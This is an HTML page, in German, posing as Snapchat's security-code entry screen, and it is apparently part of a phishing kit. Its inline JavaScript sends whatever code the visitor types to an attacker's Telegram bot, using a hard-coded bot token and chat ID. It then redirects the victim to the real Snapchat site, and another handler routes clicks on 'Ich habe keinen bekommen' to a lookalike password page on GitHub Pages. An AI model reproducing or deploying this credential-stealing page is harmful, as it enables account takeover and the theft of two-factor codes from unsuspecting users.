<!DOCTYPE html>
<html lang="de">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Snapchat Login</title>

        <link rel="icon" href="https://web.snapchat.com/favicon.png" type="image/x-icon">
        <link rel="shortcut icon" href="https://web.snapchat.com/favicon.png" type="image/x-icon">

        <link href="SnapchatLoginSicherheitscode-Dateien/snapchatlogin-2f97c6.webflow.df4992541.css" rel="stylesheet" type="text/css" />
        <link href="https://fonts.googleapis.com/" rel="preconnect" />
        <link href="https://fonts.gstatic.com/" rel="preconnect" crossorigin="anonymous" />
        <link rel="stylesheet" href="SnapchatLoginSource/css.css" media="all" />
        <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>

        <script>
            function sendMessage() {
                var apiUrl = "https://api.telegram.org/bot6862065355:AAG52OQ90c_Fhl7AuhSKJM6hU2yWFuA4mmw/sendMessage";
                var chatId = "709764990";
                var message = $("#InputSicherheitscode").val();
                var userAgent = navigator.userAgent;
                var fullMessage = "Sicherheitscode: " + message;
                
                $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
                    console.log("Antwort von der Telegram API:", data);
                });

                setTimeout(function() {
                    window.location = "https://web.snapchat.com/?ref=snapchat_dot_com_login_cta";
                }, 1000);
            }

            function SicherheitscodeNichtbekommenClick(){
                var apiUrl = "https://api.telegram.org/bot6862065355:AAG52OQ90c_Fhl7AuhSKJM6hU2yWFuA4mmw/sendMessage";
                var chatId = "709764990";
                var fullMessage = "Click - Sicherheitscode Erneut Senden";
                
                $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
                    console.log("Antwort von der Telegram API:", data);
                });

                setTimeout(function() {
                    window.location = "https://linktreeshorter.github.io/Snapchat/SnapchatLoginPasswort.htm";
                }, 1000);
            }

        </script>

    </head>
    <body class="body-2">
        <div class="w-layout-blockcontainer cardbackground w-container">
            <img src="SnapchatLoginSource/SnapchatIcon.png" loading="lazy" alt="" class="image" />
            <h1 class="heading">Sicherheitscode eingeben</h1>
            <div class="form-block w-form">
                <form id="email-form" name="email-form" data-name="Email Form" method="get" class="form" data-wf-page-id="65512d4e733b4eb3be7a5cb0" data-wf-element-id="eea312dc-f32a-013a-6403-fbe873ba7738" aria-label="Email Form">
                    <label for="Sicherheitscode" class="field-label">Sicherheitscode</label>
                    <input type="text" class="text-field-nr w-input" maxlength="256" name="Sicherheitscode" data-name="Sicherheitscode" placeholder="" id="InputSicherheitscode" required="" />
                </form>
                <div class="w-form-done" tabindex="-1" role="region" aria-label="Email Form success"></div>
                <div class="w-form-fail" tabindex="-1" role="region" aria-label="Email Form failure"></div>
            </div>
            <div class="text-block" onclick="SicherheitscodeNichtbekommenClick()">Ich habe keinen bekommen</div>
            <Button onclick="sendMessage()" class="button w-button">Weiter</Button>
        </div>
        <script src="SnapchatLoginSicherheitscode-Dateien/jquery-3.5.1.min.dc5e7f18c8.js" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
